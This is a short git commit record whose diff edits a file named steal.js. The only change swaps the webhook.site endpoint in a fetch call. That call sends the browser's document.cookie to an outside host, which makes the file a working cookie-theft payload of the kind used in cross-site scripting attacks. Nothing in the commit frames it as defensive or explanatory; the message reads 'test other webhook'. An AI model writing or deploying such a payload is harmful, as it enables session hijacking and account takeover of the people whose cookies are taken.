5d045e2eb19b98e3b3d50155f89b202b9bc593fd
GoKonggg <kongisinthehouse@gmail.com>
2026-07-14 21:03:35 +0700

    test other webhook

--- steal.js
+++ steal.js
@@ -1,5 +1,5 @@
 fetch(
-  "https://webhook.site/ffbda4d2-7273-4810-8e58-895f411832f8?data=" +
+  "https://webhook.site/2bb5b91a-5228-4992-bd7c-c2a6af288d91?data=" +
   encodeURIComponent(document.cookie),
   { mode: "no-cors" }
 );
